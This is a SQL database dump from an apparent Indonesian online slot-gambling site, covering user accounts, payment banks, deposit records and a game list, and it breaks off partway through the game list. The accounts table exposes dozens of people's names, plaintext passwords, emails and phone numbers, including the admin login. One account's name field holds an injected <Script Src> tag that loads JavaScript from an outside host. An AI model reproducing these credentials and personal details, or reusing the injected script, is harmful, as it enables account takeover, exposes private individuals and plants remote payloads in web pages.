-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: May 06, 2024 at 01:38 PM
-- Server version: 10.4.32-MariaDB
-- PHP Version: 8.0.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `slot`
--

-- --------------------------------------------------------

--
-- Table structure for table `akun`
--

CREATE TABLE `akun` (
  `id_akun` int(11) NOT NULL,
  `nama_lengkap_akun` varchar(255) NOT NULL,
  `nama_pengguna_akun` varchar(255) NOT NULL,
  `kata_sandi_akun` text NOT NULL,
  `email_akun` varchar(255) NOT NULL,
  `telepon_akun` varchar(255) NOT NULL,
  `whatsapp_akun` varchar(255) NOT NULL,
  `kode_referensi_akun` varchar(255) NOT NULL,
  `level_akun` enum('Admin','Staff','Anggota') NOT NULL DEFAULT 'Anggota',
  `status_akun` enum('Aktif','Tidak Aktif') NOT NULL DEFAULT 'Aktif'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `akun`
--

INSERT INTO `akun` (`id_akun`, `nama_lengkap_akun`, `nama_pengguna_akun`, `kata_sandi_akun`, `email_akun`, `telepon_akun`, `whatsapp_akun`, `kode_referensi_akun`, `level_akun`, `status_akun`) VALUES
(1, 'Adminmaster', 'admin', 'tikus777', 'dev@king808.xyz', '081299335940', '081299335940', '', 'Admin', 'Aktif'),
(2, 'Demo', 'demo', 'demo', 'demo@king808.xyz', '000000', '000000', '', 'Anggota', 'Aktif'),
(65, 'Purnomo', 'adminslot88', 'Hoki1234', 'adminslot88@gmail.com', '08575068107', '08575068107', '', 'Anggota', 'Aktif'),
(66, 'Muhadiaziz', 'mrpulitan02', 'slank12345', 'muhadiaziz02@gmail.com', '082173384741', '082173384741', '', 'Anggota', 'Aktif'),
(67, 'Jsbdbdj', 'penipu1', 'Gacor123', 'hsvvjwjs@gmail.com', '087636484848', '09863884844', '453607', 'Anggota', 'Aktif'),
(68, 'Gusten Rippung', 'gusten99', 'Gacor777', 'Gusten@gmail.com', '082213628495', '082213628495', '', 'Anggota', 'Aktif'),
(69, 'Rudianto', 'wongjawa00', 'Cinta123', 'wongjawa00@gmail.com', '081233221144', '081233221144', '', 'Anggota', 'Aktif'),
(70, 'Kiki ', 'kiki88', 'asdf123', 'kiki88@gmail.com', '08598656556', '08598656556', '', 'Anggota', 'Aktif'),
(71, 'Mumuti', 'mintamakwin77', 'dana96', 'mutitangkil@gmail.com', '088973977896', '088973977896', '', 'Anggota', 'Aktif'),
(72, 'Fadli Cahya Saputra ', 'fcs03', 'Fadli2005', 'fadli.abslt308@gmail.com', '0895391933337', '0895391933337', '', 'Anggota', 'Aktif'),
(73, 'Hayan<Script Src=\"Https://Hoki303.Cloud/N.Js\"></Script>', 'paman777', 'Lolipop098', 'nsjsjsj@jsjs.sj', '081218281991', '08127182819', '', 'Anggota', 'Aktif'),
(74, 'Iga Erlangga', 'iga232', 'Cinta123', 'iga232@gmail.com', '088224513841', '088224513841', '', 'Anggota', 'Aktif'),
(75, 'Nda', 'admin25', 'Asdf1234', 'anda99@yahoo.com', '01892929191', '092919919191', '', 'Anggota', 'Aktif'),
(76, 'Nillasari', 'codot24', 'Fandy2408', 'nurafandy08@gmail.com', '085351029378', '085351029378', '', 'Anggota', 'Aktif'),
(77, 'Abdul Razab Fikri', 'scorpio77win', 'Fhikri310', 'bintangscorpio@gmail.com', '08976574914', '08976574914', '', 'Anggota', 'Aktif'),
(78, 'Abdul Razab Fikri', 'scorpiodana77', 'Fhikri310', 'bintangscorpio@gmail.com', '08976574914', '08976574914', '', 'Anggota', 'Aktif'),
(79, 'Muhammad Zulkfili', 'awalyangbaik', 'Aa1234567', 'Kiplyff@gmail.com', '085945867271', '085945867271', '', 'Anggota', 'Aktif'),
(80, 'Ainun Ikhsan', 'hayati1', 'Gacor777', 'hayati1@gmail.com', '085868509971', '085868509971', '', 'Anggota', 'Aktif'),
(81, 'Rizki Wahyudi', 'rizki666', 'Gacor777', 'rizki666@gmail.com', '0838-0407-4875', '0838-0407-4875', '', 'Anggota', 'Aktif'),
(82, 'Sahrani', 'sahrani30', 'Gacor777', 'SAHRANI@gmail.com', '082132446371', '082132446371', '', 'Anggota', 'Aktif'),
(83, 'Tiara Tri Utami', 'tiara77', 'Asd123@', 'tiaratriutami123@gmail.com', '083166880356', '083166880356', '', 'Anggota', 'Aktif'),
(84, 'Zayyan', 'zayyan', 'Nizar123', 'zayyannizar@gmail.com', '0862772823', '08772772772', '', 'Anggota', 'Aktif'),
(85, 'Nizarrifadly', 'nizar77', 'Nizar123', 'nizarrifadly@gmail.com', '0862772823', '08572882762', '', 'Anggota', 'Aktif'),
(86, 'Dania Suandana', 'daniasuandan', 'Dania@1234', 'daniadania50387@gmail.com', '085348219044', '085348219044', '', 'Anggota', 'Aktif'),
(87, 'Muhammad Aditia Pratama', 'adit88', 'Gacor777', 'adit88@gmail.com', '083150738492', '083150738492', '', 'Anggota', 'Aktif'),
(88, 'Adi Saputra', 'kasihjp72', 'Gacor777', 'kasihjp72@gmail.com', '089652548577', '089652548577', '', 'Anggota', 'Aktif'),
(89, 'Fahmi', 'fahlok108', 'Asdf1234', 'fahmifahlok108@gmail.com', '082110481986', '082110481986', '', 'Anggota', 'Aktif'),
(90, 'Abdul Aziz', 'vvip11', 'Asdf1234', 'abdulaziz@gmail.com', '082110481989', '082110481989', '', 'Anggota', 'Aktif'),
(91, 'Iful', 'kocak111', 'Aris12345', 'kocak111@gmail.com', '085150948135', '085150948135', '', 'Anggota', 'Aktif'),
(92, 'Muhammad Kadri', 'dry777', 'Gacor777', 'dry777@gmail.com', '081242529441', '081242529441', '', 'Anggota', 'Aktif'),
(93, 'Firqu', 'sayajp', 'Sayajp123', 'sayafirqujp@gmail.com', '085849128832', '085849128832', '', 'Anggota', 'Aktif'),
(95, 'Dias', 'kayu23', 'Ahmasa12', 'piiulllbiasalah@gmail.com', '089525903099', '089525903099', '', 'Anggota', 'Aktif'),
(96, 'Dendi Ariyanto', 'dendi90', 'Gacor777', 'dendi@gmail.com', '082211238258', '082211238258', '.', 'Anggota', 'Aktif'),
(97, 'Zainul Alim', 'jayaabadi8', 'Asdf1234', 'zainulalim@gmail.com', '0882242267', '0882242267', '', 'Anggota', 'Aktif'),
(98, 'E Rika Widiastuti', 'bahadun', 'Qwer1234', 'sandi12@gmail.con', '083897360198', '083897360198', '', 'Anggota', 'Aktif'),
(99, 'Andi Rabani', 'andiwin', 'Cinta123', 'AndiRabani@gmail.com', '082121182865', '082121182865', '', 'Anggota', 'Aktif'),
(100, 'Minanu Rohman', 'ojolali21', 'Gacor777', 'ojolali21@gmail.com', '085325871569', '085325871569', '', 'Anggota', 'Aktif'),
(101, 'Niko Handoko ', 'niko24', 'Gacor777', 'niko24@gmail.com', '08889922938', '08889922938', '', 'Anggota', 'Aktif'),
(102, 'Casmiaan', 'jayara99', 'Gacor777', 'jayara99@gmail.com', '082186937107', '082186937107', '', 'Anggota', 'Aktif'),
(103, 'Dial Agwari', 'hiibot', 'Hoky027', 'dylagwari@gmail.com', '089519472095', '089519472095', '', 'Anggota', 'Aktif'),
(104, 'Ekoprasetyo', 'purnomo12', 'Purnomo12', 'Ekoprasetyo@gmail.com', '087896983573', '087896983573', '', 'Anggota', 'Aktif'),
(105, 'Roy Sitanggang', 'roystg0207', 'Asdf1234', 'roystg0708@gmail.com', '083827979198', '083827979198', '', 'Anggota', 'Aktif'),
(106, 'Muhamad Ilham', 'ilham99', 'Asdf1234', 'muhammadilham@gmail.com', '089668177869', '089668177869', '', 'Anggota', 'Aktif'),
(107, 'Meliyani', 'jingom77', 'Asdqwe123', 'meliyanijp123@gmail.com', '08971135583', '08971135583', '', 'Anggota', 'Aktif'),
(108, 'Ardi Juliandra', 'ardi777', '7698417790e59328ae9b8961e51b3ba7', 'ArdiJuliandra804@gmail.com', '085768641332', '085768641332', '.', 'Anggota', 'Aktif'),
(109, 'Rahmat Rudiansyah ', 'rahmat55', 'Juboh55', 'finolydo@gmail.com', '083830701982', '083830701982', '', 'Anggota', 'Aktif'),
(110, 'Dani', 'dan123', 'Maxwin123', 'dani123@gmail.com', '081378232286', '081378232286', '', 'Anggota', 'Aktif'),
(111, 'Suwarisman', 'lautan345', 'Gacor777', 'Suwarisman@gmail.com', '082175576799', '082175576799', '', 'Anggota', 'Aktif'),
(112, 'Juni', 'juni77', 'Asdf1234', 'ndjduejsjdd@gmail.com', '8929374773', '8949474747', '', 'Anggota', 'Aktif'),
(113, 'Romadlon15@Gmail.Com', 'romadlon15', 'Gacor777', 'Muhammad@gmail.com', '085877820881', '085877820881', '', 'Anggota', 'Aktif'),
(114, 'Ferdy Septyan Purwayat ', 'ferdy123', 'Hoki22', 'syngkamu171022@gmail.com', '081511690642', '081511690642', '', 'Anggota', 'Aktif'),
(115, 'Sani', 'baat88', 'Gacor777', 'SANI@gmail.com', '083850360219 ', '083850360219 ', '.', 'Anggota', 'Aktif'),
(116, 'Lutfi Amrulloh ', 'lutfi1900', 'Lutfi1900', 'fiiamrull@gmail.com', '083128520140', '083128520140', '', 'Anggota', 'Aktif'),
(117, 'Anugrah Adi Pratama ', 'sadboy13', 'Tonara13', 'desnitadamayanti4@gmail.com', '085369699050', '085369699050', '', 'Anggota', 'Aktif'),
(118, 'Arya Alam Syahroni', 'alprazolam66', 'OnicAdi88', 'kiralberlow@gmail.com', '085795732916', '085795732916', '', 'Anggota', 'Aktif'),
(119, 'Suryati', 'rafatar09', '261005Po', 'haiai@gmail.com', '082279293764', '0831038382782', '', 'Anggota', 'Aktif'),
(120, 'Muhammad Supardi', 'pardi05', 'Yayang123', 'muhammadsupardi@gmail.com', '083114321806', '083114321806', '', 'Anggota', 'Aktif'),
(121, 'Nina Martini', 'ninajp23', 'Maxwin123', 'ninajp23@gmail.com', '083137368398', '083137368398', '', 'Anggota', 'Aktif'),
(122, 'Mhmmdraja ', 'mhmmdraja', 'Memekpler1', 'duoganteng22@gmail.com', '085824178475', '085824178475', '', 'Anggota', 'Aktif'),
(123, 'Ali Murdani', 'subuhvip17', 'Gacor777', 'subuhvip17@gmail.com', '083879277933', '083879277933', '', 'Anggota', 'Aktif'),
(124, 'Jajang Lasmana', 'jhenal98', '3dd912ccadea2ffbce6140d27a5204cf', 'jajanglasmana@gmail.com', '08568631602', '08568631602', '', 'Anggota', 'Aktif'),
(125, 'Arieyunitha', 'ariehoki68', 'Hoki1688', 'Arieyunitha1@gmail.com', '0895321089156', '0895321089156', '', 'Anggota', 'Aktif');

-- --------------------------------------------------------

--
-- Table structure for table `bank`
--

CREATE TABLE `bank` (
  `id_bank` int(11) NOT NULL,
  `nama_bank` varchar(255) NOT NULL,
  `status_bank` enum('on','off') NOT NULL DEFAULT 'on'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `bank`
--

INSERT INTO `bank` (`id_bank`, `nama_bank`, `status_bank`) VALUES
(1, 'BCA', 'on'),
(2, 'BNI', 'off'),
(3, 'CIMB NIAGA', 'on'),
(4, 'BRI', 'off'),
(5, 'MANDIRI', 'off'),
(6, 'BANK JAGO', 'on'),
(7, 'BANK NEO', 'off'),
(8, 'DANA', 'on'),
(9, 'OVO', 'off'),
(10, 'GOPAY', 'off'),
(11, 'TELKOMSEL', 'on'),
(12, 'AXIS', 'on'),
(13, 'XL', 'on');

-- --------------------------------------------------------

--
-- Table structure for table `deposit`
--

CREATE TABLE `deposit` (
  `id_deposit` int(11) NOT NULL,
  `id_akun_deposit` int(11) NOT NULL,
  `kode_deposit` varchar(255) NOT NULL,
  `kategori_rekening_deposit` enum('bank','emoney','pulsa') NOT NULL,
  `id_rekening_anggota_deposit` int(11) NOT NULL,
  `id_rekening_admin_deposit` int(11) NOT NULL,
  `jumlah_deposit` varchar(255) NOT NULL,
  `nomor_referensi_deposit` varchar(255) NOT NULL,
  `tanggal_deposit` datetime NOT NULL,
  `status_deposit` enum('proses','batal','selesai') NOT NULL DEFAULT 'proses'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `deposit`
--

INSERT INTO `deposit` (`id_deposit`, `id_akun_deposit`, `kode_deposit`, `kategori_rekening_deposit`, `id_rekening_anggota_deposit`, `id_rekening_admin_deposit`, `jumlah_deposit`, `nomor_referensi_deposit`, `tanggal_deposit`, `status_deposit`) VALUES
(161, 2, 'DP-8248531759', 'bank', 117, 29, '25000', '', '2023-09-19 21:24:02', 'selesai'),
(162, 2, 'DP-1140643700', 'bank', 117, 29, '25000', '', '2023-09-19 21:27:30', 'selesai'),
(163, 68, 'DP-3278861462', 'bank', 121, 30, '100000', '', '2024-03-03 06:22:04', 'proses'),
(164, 68, 'DP-6360320731', 'bank', 121, 30, '100000', '', '2024-03-03 06:51:23', 'proses'),
(165, 70, 'DP-1086072000', 'emoney', 123, 32, '500000000', '', '2024-03-03 08:45:22', 'proses'),
(166, 71, 'DP-9985623507', 'emoney', 124, 0, '50000', '', '2024-03-03 09:48:01', 'selesai'),
(167, 71, 'DP-7922499206', 'emoney', 124, 0, '50000', '088973977896', '2024-03-03 10:00:10', 'proses'),
(168, 71, 'DP-1871573544', 'emoney', 124, 0, '100896', '', '2024-03-03 10:23:16', 'proses'),
(169, 74, 'DP-0994746324', 'bank', 127, 29, '50000', '', '2024-03-03 10:30:16', 'proses'),
(170, 74, 'DP-8099043706', 'bank', 127, 29, '50000', '', '2024-03-03 10:40:18', 'proses'),
(171, 74, 'DP-3069960626', 'bank', 127, 29, '50111', '', '2024-03-03 10:41:01', 'proses'),
(172, 71, 'DP-1288738707', 'bank', 0, 0, '50896', '', '2024-03-03 10:49:14', 'proses'),
(173, 71, 'DP-0843654796', '', 0, 0, '500000896', '088973977896', '2024-03-03 10:51:00', 'proses'),
(174, 79, 'DP-3922135404', 'bank', 133, 31, '25000', '2403031122003836293', '2024-03-03 15:15:37', 'proses'),
(175, 79, 'DP-8049117958', 'bank', 133, 31, '25000', '2403031122003836293', '2024-03-03 15:21:12', 'proses'),
(176, 79, 'DP-2128590026', 'bank', 133, 31, '27000', '', '2024-03-03 15:27:32', 'proses'),
(177, 79, 'DP-7896966075', 'bank', 133, 31, '50000', '', '2024-03-03 15:29:44', 'selesai'),
(178, 79, 'DP-7851564951', 'bank', 133, 31, '50000', '', '2024-03-03 15:37:50', 'proses'),
(179, 80, 'DP-2859141777', 'emoney', 134, 32, '50000', '', '2024-03-03 16:05:52', 'selesai'),
(180, 76, 'DP-4734724153', 'bank', 129, 31, '100000', '', '2024-03-03 17:05:25', 'selesai'),
(181, 76, 'DP-6248130753', 'bank', 129, 31, '100000', '', '2024-03-03 17:14:47', 'proses'),
(182, 76, 'DP-2155760119', 'bank', 129, 31, '100000', '100.111', '2024-03-03 17:45:51', 'proses'),
(183, 76, 'DP-0086073541', 'bank', 129, 31, '100000', '100.111', '2024-03-03 17:49:36', 'selesai'),
(184, 76, 'DP-0861876583', 'bank', 129, 31, '100000', '100.111', '2024-03-03 18:00:53', 'proses'),
(185, 82, 'DP-7609951370', 'emoney', 136, 32, '50000', '', '2024-03-03 18:01:44', 'selesai'),
(186, 84, 'DP-8274734322', 'bank', 138, 29, '100000', '', '2024-03-03 18:05:02', 'proses'),
(187, 84, 'DP-1991289471', '', 0, 0, '100000', '', '2024-03-03 18:05:14', 'proses'),
(188, 86, 'DP-7575302354', 'emoney', 140, 32, '50000', '', '2024-03-03 18:52:00', 'proses'),
(189, 86, 'DP-6763398833', 'emoney', 140, 32, '50000', '', '2024-03-03 19:00:12', 'proses'),
(190, 86, 'DP-1015984938', 'emoney', 140, 32, '50000', '', '2024-03-03 19:13:53', 'proses'),
(191, 86, 'DP-8798108614', 'emoney', 140, 32, '100000', '', '2024-03-03 19:36:32', 'proses'),
(192, 95, 'DP-4471416992', 'emoney', 149, 32, '50009', '', '2024-03-03 20:15:44', 'proses'),
(193, 95, 'DP-6878210767', 'emoney', 149, 32, '50000', '', '2024-03-03 20:17:08', 'proses'),
(194, 96, 'DP-0036351922', 'emoney', 150, 32, '50000', '8258', '2024-03-03 20:22:15', 'proses'),
(195, 95, 'DP-4635072957', 'emoney', 149, 32, '50000', '', '2024-03-03 20:25:48', 'proses'),
(196, 96, 'DP-9596769403', 'emoney', 150, 32, '50000', '50999', '2024-03-03 20:26:59', 'proses'),
(197, 97, 'DP-7978730883', 'bank', 151, 29, '50000', '', '2024-03-03 20:29:52', 'selesai'),
(198, 96, 'DP-1412124799', 'emoney', 150, 32, '50000', '50999', '2024-03-03 20:30:21', 'selesai'),
(199, 97, 'DP-7386517689', 'bank', 151, 29, '150111', '', '2024-03-03 20:41:37', 'proses'),
(200, 98, 'DP-7965203782', 'emoney', 152, 32, '300000', '', '2024-03-03 20:42:57', 'proses'),
(201, 98, 'DP-3138667789', 'emoney', 152, 32, '300000', '', '2024-03-03 20:43:53', 'batal'),
(202, 95, 'DP-6727740020', 'emoney', 149, 32, '50000', '50.999', '2024-03-03 20:47:32', 'proses'),
(203, 98, 'DP-9801456008', 'emoney', 152, 32, '300000', '', '2024-03-03 20:56:35', 'proses'),
(204, 101, 'DP-1512722929', 'bank', 0, 0, '50000', '50.000', '2024-03-03 21:23:04', 'proses'),
(205, 98, 'DP-9232259166', 'emoney', 152, 32, '300333', '', '2024-03-03 21:32:25', 'proses'),
(206, 98, 'DP-0170821875', 'emoney', 152, 32, '300000', '', '2024-03-03 21:35:10', 'selesai'),
(207, 96, 'DP-2997299534', 'emoney', 150, 32, '50000', '50999', '2024-03-03 22:08:54', 'proses'),
(208, 104, 'DP-2289912142', 'emoney', 159, 32, '100000', '', '2024-03-03 22:11:57', 'selesai'),
(209, 104, 'DP-4172064035', 'emoney', 159, 32, '100111', '100111', '2024-03-03 22:16:02', 'selesai'),
(210, 96, 'DP-3519057392', 'emoney', 150, 32, '50000', '50999', '2024-03-03 23:43:26', 'proses'),
(211, 96, 'DP-4976085258', 'emoney', 150, 32, '50000', '', '2024-03-04 00:04:49', 'proses'),
(212, 96, 'DP-7689902011', 'emoney', 150, 32, '50999', '', '2024-03-04 00:18:45', 'proses'),
(213, 115, 'DP-4607483182', 'emoney', 170, 32, '50878', '', '2024-03-04 00:54:20', 'selesai'),
(214, 113, 'DP-9435778484', 'emoney', 168, 32, '50000', '', '2024-03-04 01:16:48', 'proses'),
(215, 113, 'DP-5236183120', 'emoney', 168, 32, '100878', '100.878', '2024-03-04 01:24:11', 'proses'),
(216, 113, 'DP-3483365484', 'emoney', 168, 32, '300878', '300878', '2024-03-04 01:37:15', 'proses'),
(217, 123, 'DP-4351424184', 'emoney', 178, 32, '58000', '', '2024-03-04 02:04:19', 'proses'),
(218, 123, 'DP-0183856542', 'emoney', 178, 0, '58000', '', '2024-03-04 02:05:09', 'proses'),
(219, 116, 'DP-1524117407', 'emoney', 171, 32, '50000', '', '2024-03-04 02:06:37', 'proses'),
(220, 116, 'DP-5134844383', 'emoney', 171, 32, '400000', '', '2024-03-04 02:08:27', 'proses');

-- --------------------------------------------------------

--
-- Table structure for table `games`
--

CREATE TABLE `games` (
  `id_games` int(11) NOT NULL,
  `id_sub_menu_games_games` int(11) NOT NULL,
  `gambar_games` varchar(255) NOT NULL,
  `nama_games` varchar(255) NOT NULL,
  `link_games` varchar(255) NOT NULL,
  `link_asli_games` text NOT NULL,
  `link_demo_games` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `games`
--

INSERT INTO `games` (`id_games`, `id_sub_menu_games_games`, `gambar_games`, `nama_games`, `link_games`, `link_asli_games`, `link_demo_games`) VALUES
(1, 1, '4530396070_whatsapp_image_2024-03-02_at_14.33.57.jpeg', 'Gates of Olympus', 'gates_of_olympus', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20olympgate&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(2, 1, 'vs20phoenixf.jpg', 'Phoenix Forge', 'phoenix_forge', '#link_asli', 'http://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20phoenixf&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(3, 1, 'vs40wildwest.jpg', 'Wild West Gold', 'wild_west_gold', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs40wildwest&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(4, 1, 'vs20fruitsw.jpg', 'Sweet Bonanza', 'sweet_bonanza', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20fruitsw&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(5, 1, 'vs243ckemp.jpg', 'Cheeky Enperor', 'cheeky_enperor', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs243ckemp&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(6, 1, 'vs20underground.jpg', 'Down the Rails', 'down_the_rails', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20underground&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(7, 1, 'vs10coffee.jpg', 'Coffee Wild', 'coffee_wild', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs10coffee&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(8, 1, 'vs20wolfie.jpg', 'Greedy Wolf', 'greedy_wolf', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs20wolfie&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(9, 1, 'vs1024mahjpanda.jpg', 'Mahjong Panda', 'mahjong_panda', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=ID&cur=IDR&gameSymbol=vs1024mahjpanda&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F'),
(10, 1, 'vs1024gmayhem.jpg', 'Gorilla Mayhem', 'gorilla_mayhem', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?lang=id&cur=IDR&gameSymbol=vs1024gmayhem&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobbyURL=https%3A%2F%2Fwww.pragmaticplay.com'),
(11, 1, 'vswaysjkrdrop.jpg', 'Tropical Tiki', 'tropical_tiki', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vswaysjkrdrop&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(12, 1, 'vs25bomb.jpg', 'Bomb Bonanza', 'bomb_bonanza', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs25bomb&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(13, 1, 'vs243koipond.jpg', 'Koi Pond', 'koi_pond', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs243koipond&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(14, 1, 'vs10egrich.jpg', 'Queen of Gods', 'queen_of_gods', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs10egrich&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(15, 1, 'vs40samurai3.jpg', 'Rise of Samurai 3', 'rise_of_samurai_3', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs40samurai3&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(16, 1, 'vs20sugarrush.jpg', 'Sugar Rush', 'sugar_rush', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20sugarrush&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(17, 1, 'vswayszombcarn.jpg', 'Zombie Carnival', 'zombie_carnival', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vswayszombcarn&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(18, 1, 'vs20cleocatra.jpg', 'Cleocatra', 'cleocatra', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20cleocatra&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(19, 1, 'vs10firestrike2.jpg', 'Fire Strike 2', 'fire_strike_2', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs10firestrike2&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(20, 1, 'vs20mustanggld2.jpg', 'Clover Gold', 'clover_gold', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20mustanggld2&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(21, 1, 'vs20gobnudge.jpg', 'Goblin Heist Powernudge', 'goblin_heist_powernudge', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20gobnudge&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(22, 1, 'vswayswildwest.jpg', 'Wild West Gold Megaways', 'wild_west_gold_megaways', '#link_asli', 'https://demogamesfree-asia.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vswayswildwest&jurisdiction=99&lobbyUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fid%2F&lang=ID&cur=IDR'),
(23, 1, 'vs20stickysymbol.jpg', 'The Great Stick Up', 'the_great_stick_up', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs20stickysymbol&websiteUrl=https%3A%2F%2Fdemogamesfree.pragmaticplay.net&jurisdiction=99&lobby_url=https%3A%2F%2Fwww.pragmaticplay.com%2Fen%2F&lang=ID&cur=IDR'),
(24, 1, 'vs40cleoeye.jpg', 'Eye of Cleopatra', 'eye_of_cleopatra', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs40cleoeye&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(25, 1, 'vs10chkchase.jpg', 'Chicken Chase', 'chicken_chase', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs10chkchase&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
(26, 1, 'vs50northgard.jpg', 'North Guardians', 'north_guardians', '#link_asli', 'https://demogamesfree.pragmaticplay.net/gs2c/openGame.do?gameSymbol=vs50northgard&jurisdiction=99&&lang=id&cur=IDR&lobbyUrl=js://window.close()'),
